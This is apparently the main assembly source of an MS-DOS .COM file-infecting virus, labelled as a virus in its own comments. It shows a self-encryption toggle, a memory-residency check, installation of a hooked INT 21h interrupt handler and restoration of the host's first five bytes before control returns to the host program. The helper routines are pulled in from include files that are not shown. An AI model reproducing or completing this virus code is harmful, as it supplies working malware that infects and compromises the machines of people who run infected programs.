
.model tiny
;Tiny-model programs run only under MS-DOS. Tiny model places all data and code in a single segment.
; Therefore, the total program file size can occupy no more than 64K.
CODE_SEG SEGMENT
ASSUME CS:CODE_SEG

  
;defines where the machine code place in memory
;100H says that the machine code starts from address (offset) 100h in this segment ,For .com format the offset is always 100H
;Another example is ORG 7C00H for intel exe program format.
org 100h 

   ;for debuging..
   ;mov dl,'A' ; print 'A'
   ;mov ah,2h
   ;int 21h
START:

decrypt dw 0000H; need to do decrypt ? if this file without host dont.

cmp word ptr[decrypt],0000h
je virus_code ;Decrypt Next Time

call encrypt 
jmp INSTALL_VIRUS ;go to the installation routine
virus_code : ;from here all code encrypt in host file 
;GetRelocation bp
mov word ptr[decrypt],0001h;set decrypt for next time (when the virus have host) the code will be encrypt so decrypt it first.
jmp INSTALL_VIRUS
include data.asm
include Macro.asm ; the macro help Routines 
include ProcRout.asm

INSTALL_VIRUS:
GetRelocation bp
push cs   
pop ds 
push cs
pop es
 mov dl,'s' ; print 'A'
   mov ah,2h
   int 21h
lea si, bp+Sstart
call Printf 
 mov dl,'B' ; print 'A'
   mov ah,2h
   int 21h
;VIRUS RESIDENCY CHECK 
mov ax, nVirusID
add ax,bp
int 08h 
mov ax, nVirusID
add ax,bp 
cmp bx, ax ;virus are installed ?
je VIRUS_ALREADY_INSTALLED
; INSTALL NEW ISR FOR INT 21h 
lea si,bp+newisr
call Printf 
mov al, nISRNumber
lea si, bp+dwOldExecISR
lea dx, bP+NewDosISR
call HookISR  
  
VIRUS_ALREADY_INSTALLED:
lea si,bp+finish
call Printf 
GetRelocation bp
cmp bp,0h
je END_OF_CODE ; if equle this file is executed without a host so do not need return to host
;? TRANSFER CONTROL TO HOST PROGRAM ?
push cs
push cs
pop ds
pop es
mov di, 100h
lea si, bp+HostBytesOld
mov cx,5 ;restore 5 bytes
rep movsb
mov bx, 100h ;put old start-adres on stack (The original program)
push bx
ret ;transfer to host program
END_OF_CODE:
CODE_SEG ENDS
end start



